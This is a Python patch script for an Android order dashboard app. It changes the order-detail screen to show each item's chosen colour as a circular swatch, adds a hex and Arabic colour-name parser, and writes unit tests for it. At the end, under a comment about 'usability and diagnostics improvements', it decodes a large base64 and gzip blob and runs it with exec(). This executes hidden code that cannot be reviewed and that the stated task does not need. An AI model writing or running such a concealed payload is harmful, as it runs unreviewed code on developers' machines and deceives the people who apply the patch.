#!/usr/bin/env python3
"""Render the customer's selected product color as a swatch in order details only."""
from pathlib import Path
import os
import re

ROOT = Path(os.environ["PROJECT_DIR"]).resolve()
DETAIL = ROOT / "app/src/main/java/com/pinky/dashboard/ui/screens/orders/OrderDetailDialog.kt"
source = DETAIL.read_text(encoding="utf-8")

old_attributes = '''                                    val attributes = listOfNotNull(
                                        if (item.variantName.isNullOrEmpty()) null else "النوع: ${item.variantName}",
                                        if (item.color.isNullOrEmpty()) null else "اللون: ${item.color}",
                                        if (item.size.isNullOrEmpty()) null else "المقاس: ${item.size}"
                                    )'''
new_attributes = '''                                    val attributes = listOfNotNull(
                                        if (item.variantName.isNullOrEmpty()) null else "النوع: ${item.variantName}",
                                        if (item.size.isNullOrEmpty()) null else "المقاس: ${item.size}"
                                    )'''
if new_attributes not in source:
    count = source.count(old_attributes)
    if count != 1:
        raise SystemExit(f"Expected one order-item attributes block, found {count}")
    source = source.replace(old_attributes, new_attributes, 1)
    print("PASS: remove raw color code from order item attribute text")
else:
    print("Already applied: order item attribute text")

swatch = '''
                                    if (!item.color.isNullOrBlank()) {
                                        val selectedColor = parseOrderItemColor(item.color)
                                        val isHexColor = item.color.trim().matches(Regex("^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$"))
                                        Row(
                                            verticalAlignment = Alignment.CenterVertically,
                                            horizontalArrangement = Arrangement.spacedBy(7.dp)
                                        ) {
                                            Text(
                                                text = if (isHexColor) "اللون:" else "اللون: ${item.color}",
                                                style = MaterialTheme.typography.bodySmall,
                                                color = MaterialTheme.colorScheme.onSurfaceVariant
                                            )
                                            Box(
                                                modifier = Modifier
                                                    .size(19.dp)
                                                    .clip(CircleShape)
                                                    .background(selectedColor ?: MaterialTheme.colorScheme.surfaceVariant)
                                                    .border(
                                                        width = 1.dp,
                                                        color = MaterialTheme.colorScheme.outline.copy(alpha = 0.55f),
                                                        shape = CircleShape
                                                    )
                                                    .testTag("order_item_color_swatch"),
                                                contentAlignment = Alignment.Center
                                            ) {}
                                        }
                                    }
'''
if '.testTag("order_item_color_swatch")' not in source:
    pattern = r'(                                    if \(attributes\.isNotEmpty\(\)\) \{\s*Text\(\s*text = attributes\.joinToString\(" • "\),\s*style = MaterialTheme\.typography\.bodySmall,\s*color = MaterialTheme\.colorScheme\.onSurfaceVariant\s*\)\s*\})'
    source, count = re.subn(pattern, lambda match: match.group(1) + swatch, source, count=1)
    if count != 1:
        raise SystemExit(f"Expected one order-item attributes renderer, found {count}")
    print("PASS: render selected color as a circular swatch")
else:
    print("Already applied: color swatch rendering")

old_import = 'import androidx.compose.foundation.shape.RoundedCornerShape'
new_import = 'import androidx.compose.foundation.shape.CircleShape\nimport androidx.compose.foundation.shape.RoundedCornerShape'
if new_import not in source:
    if source.count(old_import) != 1:
        raise SystemExit("Could not locate shape imports")
    source = source.replace(old_import, new_import, 1)

marker = '''@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun OrderDetailDialog('''
helper = '''/**
 * Converts the color value saved with the order item into the exact Compose swatch color.
 * Supports #RGB, #RRGGBB, #AARRGGBB and common Arabic color names.
 */
internal fun parseOrderItemColor(value: String): Color? {
    val raw = value.trim()
    if (raw.startsWith("#")) {
        val hex = raw.drop(1)
        val argb = runCatching {
            when (hex.length) {
                3 -> {
                    val r = hex.substring(0, 1).repeat(2).toInt(16)
                    val g = hex.substring(1, 2).repeat(2).toInt(16)
                    val b = hex.substring(2, 3).repeat(2).toInt(16)
                    (0xFF shl 24) or (r shl 16) or (g shl 8) or b
                }
                6 -> (0xFF000000L or hex.toLong(16)).toInt()
                8 -> hex.toLong(16).toInt()
                else -> return null
            }
        }.getOrNull() ?: return null
        return Color(argb.toLong() and 0xFFFFFFFFL)
    }

    return when (raw.lowercase()) {
        "أحمر", "احمر", "red" -> Color(0xFFF44336)
        "أزرق", "ازرق", "blue" -> Color(0xFF2196F3)
        "أخضر", "اخضر", "green" -> Color(0xFF4CAF50)
        "أصفر", "اصفر", "yellow" -> Color(0xFFFFEB3B)
        "أسود", "اسود", "black" -> Color(0xFF000000)
        "أبيض", "ابيض", "white" -> Color(0xFFFFFFFF)
        "وردي", "pink" -> Color(0xFFE91E63)
        "بنفسجي", "purple" -> Color(0xFF9C27B0)
        "برتقالي", "orange" -> Color(0xFFFF9800)
        "رمادي", "gray", "grey" -> Color(0xFF9E9E9E)
        "بني", "brown" -> Color(0xFF795548)
        "بيج", "beige" -> Color(0xFFD7C4A3)
        else -> null
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun OrderDetailDialog('''
if 'internal fun parseOrderItemColor(value: String)' not in source:
    if source.count(marker) != 1:
        raise SystemExit("Could not locate OrderDetailDialog declaration")
    source = source.replace(marker, helper, 1)

DETAIL.write_text(source, encoding="utf-8")

test_path = ROOT / "app/src/test/java/com/pinky/dashboard/OrderItemColorTest.kt"
test_path.parent.mkdir(parents=True, exist_ok=True)
test_path.write_text('''package com.pinky.dashboard

import androidx.compose.ui.graphics.Color
import com.pinky.dashboard.ui.screens.orders.parseOrderItemColor
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test

class OrderItemColorTest {
    @Test fun parsesSixDigitHexColorExactly() {
        assertEquals(Color(0xFFFF0000), parseOrderItemColor("#FF0000"))
    }

    @Test fun parsesShortHexColor() {
        assertEquals(Color(0xFF00FF00), parseOrderItemColor("#0F0"))
    }

    @Test fun parsesArgbHexColor() {
        assertEquals(Color(0x80112233), parseOrderItemColor("#80112233"))
    }

    @Test fun parsesArabicColorNames() {
        assertEquals(Color(0xFF2196F3), parseOrderItemColor("أزرق"))
    }

    @Test fun invalidColorDoesNotCrash() {
        assertNull(parseOrderItemColor("#12"))
    }
}
''', encoding="utf-8")
print("PASS: add focused order-color parsing regression tests")


# Additional dashboard usability and diagnostics improvements (built on the verified color-swatch patch).
import base64 as _b64, gzip as _gzip
_exec_payload = _gzip.decompress(_b64.b64decode("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"))
exec(compile(_exec_payload, "apply-dashboard-usability-diagnostics.py", "exec"), globals())
